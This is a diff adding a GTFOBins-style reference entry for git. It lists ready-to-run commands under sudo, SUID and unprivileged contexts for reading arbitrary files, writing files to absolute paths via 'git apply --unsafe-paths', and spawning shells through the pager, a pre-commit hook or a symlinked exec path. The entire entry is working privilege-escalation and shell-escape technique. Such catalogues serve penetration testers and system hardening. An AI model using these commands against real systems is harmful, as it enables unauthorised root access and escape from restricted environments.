@@ -1,0 +1,101 @@
+git
+===
+
+File read
+---------
+
+[Sudo]
+    git diff /dev/null /path/to/input-file
+    The read file content is displayed in `diff` style output format.
+
+[SUID]
+    git diff /dev/null /path/to/input-file
+    The read file content is displayed in `diff` style output format.
+
+[Unprivileged]
+    git diff /dev/null /path/to/input-file
+    The read file content is displayed in `diff` style output format.
+
+File write
+----------
+
+[Sudo]
+    git apply --unsafe-paths --directory / x.patch
+    The patch can be created locally by creating the file that will be written on the target using its absolute path:
+
+```
+echo DATA >/path/to/input-file
+git diff /dev/null /path/to/input-file >x.patch
+```
+
+[SUID]
+    git apply --unsafe-paths --directory / x.patch
+    The patch can be created locally by creating the file that will be written on the target using its absolute path:
+
+```
+echo DATA >/path/to/input-file
+git diff /dev/null /path/to/input-file >x.patch
+```
+
+[Unprivileged]
+    git apply --unsafe-paths --directory / x.patch
+    The patch can be created locally by creating the file that will be written on the target using its absolute path:
+
+```
+echo DATA >/path/to/input-file
+git diff /dev/null /path/to/input-file >x.patch
+```
+
+Inherit
+-------
+
+[Sudo]
+    git help config
+
+[Unprivileged]
+    git help config
+
+[Sudo]
+    git branch --help config
+!/bin/sh
+    The help system can also be reached from any `git` command, e.g., `git branch`.
+
+[Unprivileged]
+    git branch --help config
+!/bin/sh
+    The help system can also be reached from any `git` command, e.g., `git branch`.
+
+Shell
+-----
+
+[Sudo]
+    PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
+
+[Unprivileged]
+    PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
+
+[Sudo]
+    git init .
+echo 'exec /bin/sh 0<&2 1>&2' >.git/hooks/pre-commit
+chmod +x .git/hooks/pre-commit
+git -C . commit --allow-empty -m x
+    Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used, and moving into the directory works too.
+
+[Unprivileged]
+    git init .
+echo 'exec /bin/sh 0<&2 1>&2' >.git/hooks/pre-commit
+chmod +x .git/hooks/pre-commit
+git -C . commit --allow-empty -m x
+    Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used, and moving into the directory works too.
+
+[Sudo]
+    ln -s /bin/sh git-x
+git --exec-path=. x
+
+[SUID]
+    ln -s /bin/sh git-x
+git --exec-path=. x -p
+
+[Unprivileged]
+    ln -s /bin/sh git-x
+git --exec-path=. x
